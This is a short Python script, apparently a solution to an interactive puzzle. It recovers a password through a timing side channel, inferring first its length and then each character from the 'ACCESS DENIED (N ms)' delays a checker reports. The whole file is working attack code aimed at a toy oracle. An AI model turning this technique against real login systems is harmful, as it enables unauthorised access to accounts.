#!/usr/bin/env python3
import string

chars = string.ascii_uppercase + string.ascii_lowercase + string.digits


l = (0, 0)

for i in range(1, 21):
    print("A" * i, flush=True)

    try:
        inp = input()
        if "ACCESS GRANTED" in inp:
            exit()
        line = int(inp[len("ACCESS DENIED (") : -len(" ms)")])
    except:
        exit()

    # print(f"{line = }")

    l = max(l, (line, i))

l = l[1]

# print(f"{l = }")

passwd = "A" * l

for p in range(l):
    tmp = (0, "A")

    passwdpre = passwd[:p]
    passwdpost = passwd[p + 1 :]

    for char in chars:
        npasswd = passwdpre + char + passwdpost
        print(npasswd, flush=True)

        try:
            inp = input()
            if "ACCESS GRANTED" in inp:
                exit()
            line = int(inp[len("ACCESS DENIED (") : -len(" ms)")])
        except:
            exit()

        tmp = max(tmp, (line, char))

    passwd = passwdpre + tmp[1] + passwdpost

print(passwd, flush=True)
